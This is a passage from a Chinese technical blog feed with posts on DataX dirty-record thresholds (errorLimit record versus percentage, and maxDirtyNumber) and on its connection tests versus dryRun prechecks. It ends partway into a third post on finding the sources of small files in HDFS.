    <content><![CDATA[<p>DataX 任务想容忍少量脏数据，通常会在 <code>job.setting.errorLimit</code> 里同时写条数和比例：小表不超过 10 条，大表不超过万分之一。这个意图很合理，但 2020 年底这版 DataX 并不会同时检查两条规则。</p>
<p>只要配置了 <code>record</code>，<code>ErrorRecordChecker</code> 就把 <code>percentageLimit</code> 设成 <code>null</code>。两个参数都写时，真正生效的只有条数。</p>
<p>另一个容易混淆的配置是 <code>core.statistics.collector.plugin.maxDirtyNumber</code>。它限制的是控制台最多打印多少条脏数据，不是任务能够容忍多少条。把这两个 <code>max</code> 当成同一个阈值，会得到一条“日志看起来不多，任务却突然失败”或“日志只打印几条，任务居然成功”的链路。</p>
<p>这篇笔记仍然使用 DataX 提交 <code>5485fb3</code>，提交时间是 2020 年 12 月 17 日。</p>
<p class="article-diagram-scroll"><img src="/images/articles/datax-dirty-record-flow.svg" class="lazyload" data-srcset="/images/articles/datax-dirty-record-flow.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="DataX 脏数据采集、日志输出与阈值检查"></p>
<span id="more"></span>

<h2 id="哪些记录会进入脏数据计数"><a href="#哪些记录会进入脏数据计数" class="headerlink" title="哪些记录会进入脏数据计数"></a>哪些记录会进入脏数据计数</h2><p>Reader、Transformer 和 Writer 都可能把一条 Record 交给 <code>TaskPluginCollector.collectDirtyRecord()</code>。</p>
<p>典型情况包括字段转换失败、Writer 写入单条记录报错，以及单条 Record 的估算内存超过 Channel 的 <code>byteCapacity</code>。以 <code>BufferedRecordExchanger.sendToWriter()</code> 为例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (record.getMemorySize() &gt; <span class="built_in">this</span>.byteCapacity) &#123;</span><br><span class="line">    <span class="built_in">this</span>.pluginCollector.collectDirtyRecord(</span><br><span class="line">            record,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Exception</span>(<span class="string">&quot;单条记录超过大小限制&quot;</span>));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Collector 会按错误发生的位置增加不同计数：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Reader / Transformer 侧 -&gt; readFailedRecords</span><br><span class="line">Writer 侧               -&gt; writeFailedRecords</span><br></pre></td></tr></table></figure>

<p>Job 的总错误记录数是两者相加：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">totalErrorRecords = readFailedRecords + writeFailedRecords;</span><br></pre></td></tr></table></figure>

<p>这里统计的是被插件明确收集的脏 Record。插件直接抛出导致 Task 失败、JVM 退出或网络连接中断，不一定会转成一条脏数据。反过来也一样，任务最终状态是成功，并不表示每条输入都写到了目标端；只要错误数没有越过阈值，它可以带着脏数据成功结束。</p>
<p>所以我不会只看 Job 状态验收同步任务。成功状态要和读取条数、写入成功条数、脏数据条数一起看。</p>
<h2 id="record-的优先级不是文档约定，而是代码清空"><a href="#record-的优先级不是文档约定，而是代码清空" class="headerlink" title="record 的优先级不是文档约定，而是代码清空"></a><code>record</code> 的优先级不是文档约定，而是代码清空</h2><p>任务模板给过这样的示例：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;job&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;setting&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;errorLimit&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;record&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;percentage&quot;</span><span class="punctuation">:</span> <span class="number">0.02</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>如果按配置表面理解，这是“脏数据不能超过 0 条，同时比例不能超过 2%”。第一条已经足够严格，第二条没有意义。<code>ErrorRecordChecker</code> 的构造器干脆把优先级写死了：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (recordLimit != <span class="literal">null</span>) &#123;</span><br><span class="line">    Validate.isTrue(recordLimit &gt;= <span class="number">0</span>);</span><br><span class="line">    percentageLimit = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这意味着下面两份配置效果相同：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;record&quot;</span><span class="punctuation">:</span> <span class="number">10</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;record&quot;</span><span class="punctuation">:</span> <span class="number">10</span><span class="punctuation">,</span> <span class="attr">&quot;percentage&quot;</span><span class="punctuation">:</span> <span class="number">0.0001</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>第二份不会在 10 条以内继续校验万分之一。想做“条数和比例任一超限就失败”，不能靠这一版 DataX 的原生配置，需要平台在任务结束后拿总量和错误数再做一次质量检查，或者修改 <code>ErrorRecordChecker</code> 的优先级逻辑。</p>
<p>这类配置我更倾向于在任务发布页直接阻止：选了条数阈值，就把比例输入置灰并解释原因。允许用户填两个值但静默忽略一个，故障时很难讲清楚。</p>
<h2 id="两种阈值的检查时机也不同"><a href="#两种阈值的检查时机也不同" class="headerlink" title="两种阈值的检查时机也不同"></a>两种阈值的检查时机也不同</h2><p>条数阈值会在 Scheduler 运行循环里持续检查。<code>AbstractScheduler.schedule()</code> 每轮汇总 TaskGroup 的 Communication 后调用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">errorLimit.checkRecordLimit(nowJobContainerCommunication);</span><br></pre></td></tr></table></figure>

<p>当 <code>totalErrorRecords</code> 大于 <code>recordLimit</code>，Job 立即抛出 <code>PLUGIN_DIRTY_DATA_LIMIT_EXCEED</code>。判断是严格的大于号，所以 <code>record=10</code> 会允许前 10 条，第 11 条触发失败；<code>record=0</code> 则是第一条脏数据出现就失败。</p>
<p>检查并非每条 Record 都同步执行。Scheduler 还有自己的 sleep 周期，因此在发现越界前，Reader 和 Writer 可能已经继续处理了一批数据。目标端不是事务性整批提交时，任务失败也不等于目标表没有留下部分结果。</p>
<p>比例阈值只在 <code>scheduler.schedule()</code> 完成后，由 <code>JobContainer.checkLimit()</code> 做最终检查：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">errorLimit.checkRecordLimit(communication);</span><br><span class="line">errorLimit.checkPercentageLimit(communication);</span><br></pre></td></tr></table></figure>

<p>比例的分母是 <code>totalReadRecords</code>，即 <code>readSucceedRecords + readFailedRecords</code>；分子是 Reader 与 Writer 两侧失败记录之和。任务必须把数据跑完，才能得到最终比例。</p>
<p>这两种时机对应不同成本。条数阈值适合尽快止损，比例阈值适合数据规模差异很大的任务，但超限时整批读取和大部分写入可能已经发生。使用比例阈值的任务更需要可回滚的写入方式。</p>
<h2 id="maxDirtyNumber-只管打印，不管失败"><a href="#maxDirtyNumber-只管打印，不管失败" class="headerlink" title="maxDirtyNumber 只管打印，不管失败"></a><code>maxDirtyNumber</code> 只管打印，不管失败</h2><p>默认 <code>core.json</code> 里还有一项：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;core&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;statistics&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;collector&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;plugin&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;maxDirtyNumber&quot;</span><span class="punctuation">:</span> <span class="number">10</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>它被 <code>StdoutPluginCollector</code> 读取，用来控制脏记录日志输出。无论后面的脏数据还打印不打印，父类 <code>AbstractTaskPluginCollector.collectDirtyRecord()</code> 都会继续增加失败计数。</p>
<p>也就是说，控制台只看到少量样本，不代表后面没有继续丢记录。这个设计能防止一批坏数据把日志写爆，但运维平台如果只从文本日志统计脏数据，会严重少算。正确数字应该取 Communication Counter，日志样本用于定位字段和值。</p>
<p>我还会把脏数据样本单独落到隔离存储，至少包含：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">jobId / taskGroupId / taskId</span><br><span class="line">源记录或脱敏后的字段值</span><br><span class="line">Reader / Transformer / Writer 阶段</span><br><span class="line">异常类型与消息</span><br><span class="line">任务代码版本和配置版本</span><br><span class="line">采集时间</span><br></pre></td></tr></table></figure>

<p>DataX 默认 stdout 格式能打印 <code>type</code>、<code>message</code>、<code>exception</code> 和 Record 列值，但日志会轮转，也可能因为隐私要求不能保留完整字段。平台要把“错误计数”和“可排查样本”分成两条链路管理。</p>
<h2 id="阈值应该跟下游语义绑定"><a href="#阈值应该跟下游语义绑定" class="headerlink" title="阈值应该跟下游语义绑定"></a>阈值应该跟下游语义绑定</h2><p>同样是 10 条脏数据，影响可以完全不同。日志明细表缺 10 行也许可以补录，客户余额表少一行都不能放过。阈值不是 DataX 层面的统一默认值，应该由数据用途决定。</p>
<p>我会先给任务选择处理策略：</p>
<ul>
<li>强一致任务使用 <code>record=0</code>，发现脏数据就失败，写入端要支持整批回滚或覆盖重跑；</li>
<li>允许隔离的明细任务可以设条数阈值，但必须落脏数据明细并生成处理工单；</li>
<li>超大批次若使用比例阈值，要额外设置平台级绝对上限，避免低比例掩盖很大的错误总量；</li>
<li>探查或一次性迁移任务可以继续运行，但结果必须标记“带脏数据完成”，不能和正常成功混成一个状态。</li>
</ul>
<p>这里故意没有给一个通用比例。百分之一对一千行是 10 条，对十亿行就是一千万条。脱离数据规模和业务键谈默认容忍率，没有工程意义。</p>
<h2 id="发布任务前我会做的验证"><a href="#发布任务前我会做的验证" class="headerlink" title="发布任务前我会做的验证"></a>发布任务前我会做的验证</h2><p>先用可控数据造三类错误：Reader 类型转换失败、Transformer 主动报错、Writer 违反目标表约束。确认三类错误分别进入哪个 Counter，日志里有没有可识别样本。</p>
<p>随后验证边界值。<code>record=10</code> 时跑出 10 条和 11 条错误，确认前者成功、后者失败；只设置 <code>percentage</code> 时，用固定总量验证等于阈值和超过阈值的行为。</p>
<p>最后再测失败后的目标表。检查已经提交的批次是否保留，重跑是追加、覆盖还是幂等更新。阈值只负责决定 Job 状态，不负责清理已经写出的数据。</p>
<p>DataX 把脏数据采集、日志采样和失败判定拆成了三件事。理解这三条链路以后，<code>errorLimit</code> 才能成为数据质量契约；否则它只是一个看起来很严格、实际含义却没人说得清的 JSON 配置。</p>
<h2 id="对照源码"><a href="#对照源码" class="headerlink" title="对照源码"></a>对照源码</h2><ul>
<li><a href="https://github.com/alibaba/DataX/blob/5485fb328eb03fab5c2164a79e902d344475e27f/core/src/main/java/com/alibaba/datax/core/util/ErrorRecordChecker.java#L12-L81"><code>ErrorRecordChecker</code>：record 优先并清空 percentage</a></li>
<li><a href="https://github.com/alibaba/DataX/blob/5485fb328eb03fab5c2164a79e902d344475e27f/core/src/main/java/com/alibaba/datax/core/job/scheduler/AbstractScheduler.java#L59-L103"><code>AbstractScheduler.schedule()</code>：运行中检查条数阈值</a></li>
<li><a href="https://github.com/alibaba/DataX/blob/5485fb328eb03fab5c2164a79e902d344475e27f/core/src/main/java/com/alibaba/datax/core/job/JobContainer.java#L957-L966"><code>JobContainer.checkLimit()</code>：任务结束后检查最终阈值</a></li>
<li><a href="https://github.com/alibaba/DataX/blob/5485fb328eb03fab5c2164a79e902d344475e27f/core/src/main/java/com/alibaba/datax/core/statistics/plugin/task/AbstractTaskPluginCollector.java#L47-L76"><code>AbstractTaskPluginCollector</code>：Reader 与 Writer 脏数据计数</a></li>
<li><a href="https://github.com/alibaba/DataX/blob/5485fb328eb03fab5c2164a79e902d344475e27f/core/src/main/java/com/alibaba/datax/core/statistics/plugin/task/StdoutPluginCollector.java#L35-L73"><code>StdoutPluginCollector</code>：脏数据日志采样上限</a></li>
<li><a href="https://github.com/alibaba/DataX/blob/5485fb328eb03fab5c2164a79e902d344475e27f/core/src/main/java/com/alibaba/datax/core/statistics/communication/CommunicationTool.java#L83-L105"><code>CommunicationTool</code>：总读取数与总错误数计算</a></li>
</ul>
]]></content>
      <categories>
        <category>数据同步</category>
      </categories>
      <tags>
        <tag>DataX</tag>
        <tag>脏数据</tag>
        <tag>数据质量</tag>
      </tags>
  </entry>
  <entry>
    <title>DataX 测试连接成功为什么任务仍会失败：从 JDBC 握手到 dryRun 预检</title>
    <url>//2021/01/18/datax-datasource-precheck/</url>
    <content><![CDATA[<p>数据源页面显示“测试连接成功”，任务发布后仍然报表不存在、没有查询权限或连接中断，这种情况并不矛盾。测试连接通常只完成 JDBC 建连，最多证明当前网络、账号和密码能建立一个短连接。</p>
<p>同步任务要求更多：Reader 要执行真实 SQL，切分键需要能参与查询；Writer 要有目标表写入权限，<code>preSql</code>、<code>postSql</code> 还要通过语法检查。任务跑几个小时以后，连接空闲超时、游标、字符集和网络设备的行为也会出现。</p>
<p>DataX 在 2020 年底已经有两套不同深度的检查：<code>DBUtil.testConnWithoutRetry()</code> 和 Job 的 <code>dryRun</code>。把源码走一遍，就能知道页面上的绿色图标到底证明了什么。</p>
<p class="article-diagram-scroll"><img src="/images/articles/datax-datasource-precheck.svg" class="lazyload" data-srcset="/images/articles/datax-datasource-precheck.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="DataX 数据源从建连到真实任务的检查层次"></p>
<span id="more"></span>

<h2 id="建立-JDBC-Connection-只过了第一层"><a href="#建立-JDBC-Connection-只过了第一层" class="headerlink" title="建立 JDBC Connection 只过了第一层"></a>建立 JDBC Connection 只过了第一层</h2><p><code>DBUtil.testConnWithoutRetry()</code> 的普通分支很短：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">connection = connect(dataBaseType, url, user, pass);</span><br><span class="line"><span class="keyword">if</span> (connection != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>MySQL 在指定 <code>checkSlave</code> 时会多查一次主从延迟，其余情况拿到非空 Connection 就返回成功。这个方法能够发现地址不可达、驱动不匹配、认证失败等问题，不能证明账号能读取任务中的表。</p>
<p>把连接测试拆开看，大概有这些层次：</p>
<table>
<thead>
<tr>
<th>层次</th>
<th>可以验证</th>
<th>仍未验证</th>
</tr>
</thead>
<tbody><tr>
<td>TCP &#x2F; JDBC 建连</td>
<td>地址、端口、驱动、账号认证</td>
<td>表权限和 SQL</td>
</tr>
<tr>
<td>查询预检</td>
<td>表、字段、查询权限、部分 SQL 语法</td>
<td>大结果集和长时间游标</td>
</tr>
<tr>
<td>Writer 预检</td>
<td>INSERT&#x2F;DELETE 权限、pre&#x2F;post SQL 语法</td>
<td>实际批次提交与锁冲突</td>
</tr>
<tr>
<td>小规模试跑</td>
<td>字段转换、字符集、读写路径</td>
<td>峰值数据量与长时稳定性</td>
</tr>
<tr>
<td>生产运行</td>
<td>真实吞吐与持续连接</td>
<td>下一次网络或数据变化</td>
</tr>
</tbody></table>
<p>我会让页面明确显示每一层的结果，而不是把它们压成一个“连接正常”。用户看到绿色标记，自然会认为任务已经具备读写条件；如果系统只做了第一层，问题其实出在产品语义。</p>
<h2 id="dryRun-会初始化插件并调用-Reader、Writer-预检"><a href="#dryRun-会初始化插件并调用-Reader、Writer-预检" class="headerlink" title="dryRun 会初始化插件并调用 Reader、Writer 预检"></a><code>dryRun</code> 会初始化插件并调用 Reader、Writer 预检</h2><p>Job 配置 <code>job.setting.dryRun=true</code> 时，<code>JobContainer.start()</code> 不进入正常的 <code>prepare -&gt; split -&gt; schedule</code>，而是执行 <code>preCheck()</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">isDryRun = configuration.getBool(<span class="string">&quot;job.setting.dryRun&quot;</span>, <span class="literal">false</span>);</span><br><span class="line"><span class="keyword">if</span> (isDryRun) &#123;</span><br><span class="line">    <span class="built_in">this</span>.preCheck();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.preHandle();</span><br><span class="line">    <span class="built_in">this</span>.init();</span><br><span class="line">    <span class="built_in">this</span>.prepare();</span><br><span class="line">    <span class="built_in">this</span>.split();</span><br><span class="line">    <span class="built_in">this</span>.schedule();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>preCheck()</code> 会分别初始化 Reader.Job 和 Writer.Job，再调用各自插件实现。对于 MySQLReader、MySQLWriter，最终进入 <code>CommonRdbmsReader</code> 与 <code>CommonRdbmsWriter</code>。</p>
<p>这比单独测试数据源有价值，因为检查使用的是整份任务配置。JDBC URL、账号、表、列、<code>querySql</code>、<code>splitPk</code>、<code>preSql</code> 和 <code>postSql</code> 都进入同一条验证链路。</p>
<p>但它仍然是预检，不是一次完整同步。把 dryRun 成功写成“任务可运行”，同样会过度承诺。</p>
<h2 id="Reader-预检会执行第一条真实查询"><a href="#Reader-预检会执行第一条真实查询" class="headerlink" title="Reader 预检会执行第一条真实查询"></a>Reader 预检会执行第一条真实查询</h2><p>RDBMS Reader 的 <code>preCheck()</code> 为每个 connection 配置创建 <code>PreCheckTask</code>，线程池最多 10 个并发。任务先通过 <code>DBUtil.sqlValid()</code> 解析 SQL，然后对每个 connection 的第一条 <code>querySql</code> 做真实查询。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">DBUtil.sqlValid(querySql, dataBaseType);</span><br><span class="line"><span class="keyword">if</span> (i == <span class="number">0</span>) &#123;</span><br><span class="line">    rs = DBUtil.query(conn, querySql, fetchSize);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这一步能抓到不少“连接成功但任务必然失败”的问题：库表不存在、字段写错、查询权限不足、数据库不接受生成后的 SQL。</p>
<p>切分键也有单独预检。Reader 会构造 splitPk SQL，做语法校验，并在第一个查询上执行 <code>precheckSplitPk()</code>。所以 dryRun 还可以提前发现切分列不可用，而简单建连完全碰不到这一层。</p>
<p>边界也很清楚。多条 <code>querySql</code> 会全部经过解析器，但源码只执行索引为 0 的那条真实查询。后续 SQL 若在数据库方才暴露问题，预检可能放过。查询只取很小的 fetchSize，也不会模拟百万行结果、慢 SQL、服务端游标和长连接。</p>
<p>另一个需要谨慎的点是“真实查询”。如果用户在 <code>querySql</code> 中放了昂贵的视图或无分区条件的大表扫描，dryRun 也可能给源库制造负载。预检接口要有超时和并发限制，不能因为名字里有 dry 就当它没有成本。</p>
<h2 id="Writer-预检检查权限，但不会写一批真实数据"><a href="#Writer-预检检查权限，但不会写一批真实数据" class="headerlink" title="Writer 预检检查权限，但不会写一批真实数据"></a>Writer 预检检查权限，但不会写一批真实数据</h2><p><code>CommonRdbmsWriter.writerPreCheck()</code> 做两类事情：解析 <code>preSql</code>、<code>postSql</code>，检查 INSERT 和必要时的 DELETE 权限。</p>
<p>MySQL&#x2F;Oracle 的 INSERT 权限检查会执行一条零行插入：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert into</span> target_table</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> target_table <span class="keyword">where</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>DELETE 权限检查类似：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> target_table <span class="keyword">where</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>DELETE 只有在 <code>preSql</code> 或 <code>postSql</code> 以 <code>DELETE</code> 开头时才检查。<code>preSql</code>、<code>postSql</code> 本身在这条预检路径里只走 SQL 解析，不会按生产语义实际执行。</p>
<p>零行 DML 比查询权限更接近 Writer 的真实要求，仍然覆盖不了下面这些问题：</p>
<ul>
<li>任务指定列与目标字段类型是否能接收真实值；</li>
<li>批量提交时是否触发唯一键冲突、锁等待或事务日志压力；</li>
<li><code>replace</code>、<code>update</code> 等写入模式是否符合表上的主键设计；</li>
<li>实际 <code>preSql</code> 清理数据时会不会扫描过大或与在线事务冲突；</li>
<li>连接运行数小时后是否被数据库、代理或防火墙回收。</li>
</ul>
<p>因此 Writer 预检适合挡住确定性配置错误，不适合替代一次受控样本写入。</p>
<h2 id="为什么真实任务仍然可能在几小时后断掉"><a href="#为什么真实任务仍然可能在几小时后断掉" class="headerlink" title="为什么真实任务仍然可能在几小时后断掉"></a>为什么真实任务仍然可能在几小时后断掉</h2><p>短连接通过后，长任务还会遇到另一组变量。</p>
<p>数据库或代理可能配置连接最大生命周期、空闲超时和服务端游标限制。Reader 查询慢时，网络设备会把长时间没有数据包的连接当作空闲连接清理。Writer 批次太大，又可能在提交阶段超过 socket timeout。</p>
<p>字符集、时区和数值精度也往往要等真实记录出现才暴露。<code>select 1</code> 没有中文、零日期、超长 decimal 和大字段，自然验证不到它们。</p>
<p>多 connection 配置还会带来差异。预检按每个 connection 建立连接，但一份任务里的多条 SQL 未必全部执行；主库测试正常，不代表另一个分片地址、只读副本或路由规则完全一致。</p>
<p>我会在发布前增加一条“小样本链路”：使用和生产相同的 Reader、Transformer、Writer，限制主键范围或分区，只同步一批可回滚记录。它不是压测，目标是让字段值真正经过序列化、转换、批量写和提交。</p>
<h2 id="平台上的测试结果要能还原"><a href="#平台上的测试结果要能还原" class="headerlink" title="平台上的测试结果要能还原"></a>平台上的测试结果要能还原</h2><p>只保存一个布尔值没有诊断价值。一次测试至少应该记录：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">测试时间与发起人</span><br><span class="line">数据源配置版本（密码只留密文版本号）</span><br><span class="line">执行节点与网络出口</span><br><span class="line">JDBC 驱动及版本</span><br><span class="line">检查层次：connect / reader preCheck / writer preCheck / sample run</span><br><span class="line">每一层耗时和原始错误码</span><br></pre></td></tr></table></figure>

<p>执行节点尤其重要。浏览器访问平台后端测试成功，不代表生产 Worker 所在网络能连到数据库；用控制面节点做测试，再让数据面节点跑任务，是很常见的误判。</p>
<p>我通常要求最终发布校验必须从真实执行池发起。页面可以先做快速连接测试，让用户及时发现账号密码错误；发布时再用完整任务配置跑 dryRun 和小样本。两次测试解决的问题不同，不能互相替代。</p>
<p>“测试连接成功”最准确的翻译应该是：这次从某个节点，用某个配置版本，完成了某个深度的检查。把范围说清楚以后，绿色标记才不会成为后续排障的干扰项。</p>
<h2 id="对照源码"><a href="#对照源码" class="headerlink" title="对照源码"></a>对照源码</h2><ul>
<li><a href="https://github.com/alibaba/DataX/blob/5485fb328eb03fab5c2164a79e902d344475e27f/plugin-rdbms-util/src/main/java/com/alibaba/datax/plugin/rdbms/util/DBUtil.java#L583-L628"><code>DBUtil.testConnWithoutRetry()</code>：普通连接测试的实际范围</a></li>
<li><a href="https://github.com/alibaba/DataX/blob/5485fb328eb03fab5c2164a79e902d344475e27f/core/src/main/java/com/alibaba/datax/core/job/JobContainer.java#L91-L128"><code>JobContainer.start()</code>：dryRun 与正式执行分支</a></li>
<li><a href="https://github.com/alibaba/DataX/blob/5485fb328eb03fab5c2164a79e902d344475e27f/plugin-rdbms-util/src/main/java/com/alibaba/datax/plugin/rdbms/reader/CommonRdbmsReader.java#L61-L98"><code>CommonRdbmsReader.preCheck()</code>：并发检查 connection 配置</a></li>
<li><a href="https://github.com/alibaba/DataX/blob/5485fb328eb03fab5c2164a79e902d344475e27f/plugin-rdbms-util/src/main/java/com/alibaba/datax/plugin/rdbms/reader/util/PreCheckTask.java#L41-L99"><code>PreCheckTask.call()</code>：真实查询与 splitPk 检查</a></li>
<li><a href="https://github.com/alibaba/DataX/blob/5485fb328eb03fab5c2164a79e902d344475e27f/plugin-rdbms-util/src/main/java/com/alibaba/datax/plugin/rdbms/writer/CommonRdbmsWriter.java#L47-L84"><code>CommonRdbmsWriter.writerPreCheck()</code>：SQL 与写入权限检查</a></li>
<li><a href="https://github.com/alibaba/DataX/blob/5485fb328eb03fab5c2164a79e902d344475e27f/plugin-rdbms-util/src/main/java/com/alibaba/datax/plugin/rdbms/util/DBUtil.java#L218-L270"><code>DBUtil.checkInsertPrivilege()</code>：零行 INSERT 权限验证</a></li>
</ul>
]]></content>
      <categories>
        <category>数据同步</category>
      </categories>
      <tags>
        <tag>DataX</tag>
        <tag>JDBC</tag>
        <tag>故障诊断</tag>
      </tags>
  </entry>
  <entry>
    <title>HDFS 小文件治理为什么不能只做定时合并：先查文件是怎么产生的</title>
    <url>//2021/02/25/hdfs-small-files-governance/</url>
    <content><![CDATA[<p>一说 HDFS 小文件治理，最常见的动作是安排一个夜间任务，把昨天的文件再合并一次。这个办法能让目录暂时好看一些，却很容易变成另一条长期运行的数据链路：白天持续制造小文件，晚上再花计算和 IO 把它们重写。</p>
<p>我不太赞成先上合并任务。小文件是一种结果，产生它的地方可能是过细的 Hive 分区、过多的 Reducer、流任务滚动过快，也可能是同步工具为每个并发通道各写一个文件。没有先找到生产者，存量清理得越勤，平台越难看清真正的写入模型。</p>
<p>这篇文章以 Hadoop 3.3.0 的文档和源码为准，先确认小文件到底给 HDFS 增加了什么负担，再讨论 <code>concat</code>、HAR 和重写任务各自适合做什么。</p>
<p class="article-diagram-scroll"><img src="/images/articles/hdfs-small-files-governance.svg" class="lazyload" data-srcset="/images/articles/hdfs-small-files-governance.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="HDFS 小文件从发现到治理的闭环"></p>
<span id="more"></span>

<h2 id="小文件占用的不是一个完整-block"><a href="#小文件占用的不是一个完整-block" class="headerlink" title="小文件占用的不是一个完整 block"></a>小文件占用的不是一个完整 block</h2><p>HDFS 默认 block 较大，但“1 KB 文件也会浪费 128 MB 磁盘”并不准确。HDFS 把文件切成一个或多个 block，最后一个 block 可以小于配置的 block size。文件实际只有 1 KB，不会因为 block size 配成 128 MB，就在 DataNode 上预先写满 128 MB 数据。</p>
<p>小文件真正麻烦的地方是元数据数量。HDFS 3.3.0 的设计文档写得很直接：NameNode 维护文件系统 namespace，也维护文件到 block 的映射；整个 namespace 和 block map 保存在内存里。文件越多，inode、block、目录项和 block 位置信息就越多。精确到“每个文件占多少字节”的固定数字反而不可靠，它会随 Hadoop 版本、JVM 对象布局、文件属性和副本信息变化。</p>
<p>这类压力不只表现为 NameNode 堆内存上涨。一个分区下有几万个文件时，列目录、获取文件状态和生成计算任务切片都会产生更多 RPC 与对象。真正读数据时，每个小文件通常还带来打开文件、定位 block 和调度 task 的固定成本。数据量可能只有几十 GB，启动和调度时间却比扫描本身更长。</p>
<p>所以我会同时看两类指标：一类是 NameNode 的 namespace、block 和 RPC 状态；另一类是消费作业的文件枚举耗时、input split 数量、task 数量和有效扫描吞吐。只看 HDFS 剩余容量，很难发现小文件已经开始拖慢平台。</p>
<h2 id="先按目录和生产任务做一张账"><a href="#先按目录和生产任务做一张账" class="headerlink" title="先按目录和生产任务做一张账"></a>先按目录和生产任务做一张账</h2><p>治理前，我会把统计粒度落到“表 &#x2F; 分区 &#x2F; 生产任务”，而不是只给集群报一个小文件总数。至少要回答这些问题：</p>
<table>
<thead>
<tr>
<th>观察项</th>
<th>要解决的问题</th>
</tr>
</thead>
<tbody><tr>
<td>每日新增文件数</td>
<td>小文件是否仍在增长，增长速度多快</td>
</tr>
<tr>
<td>文件大小中位数与 P95</td>
<td>是整体偏小，还是少量异常文件</td>
</tr>
<tr>
<td>单目录文件数</td>
<td>哪些分区给 listStatus 和调度带来压力</td>
</tr>
<tr>
<td>创建时间、属主、路径规则</td>
<td>能否反查到具体调度任务或写入组件</td>
</tr>
<tr>
<td>下游读取频率</td>
<td>应该立即治理，还是先处理高频路径</td>
</tr>
<tr>
<td>分区数据量与写并发</td>
<td>分区设计和并行度是否匹配</td>
</tr>
</tbody></table>
<p>“小于 128 MB 都算小文件”也太粗。日增 20 MB、一个月才读一次的归档分区，与每小时写 20 MB、每天被几十个任务扫描的热分区，处理优先级完全不同。阈值应结合数据增长、读取方式和集群规模确定。</p>
<p>归因时最有用的不是文件名，而是生产链路。Hive 插入任务要看最终 Reducer 数和动态分区数量；数据同步任务要看 Writer 通道数；Flink 类流任务要看并行度、滚动策略和 checkpoint 对文件提交的影响。一个任务同时写 200 个分区，即使每个分区只落一个文件，也会在一次调度里产生 200 个文件。</p>
<p>我会先对增长最快的目录做采样，把路径映射回任务实例，再改生产配置。这样第二天复查“新增文件数”就能知道修改是否有效。先做存量合并，只能证明清理任务跑过，不能证明问题停了。</p>
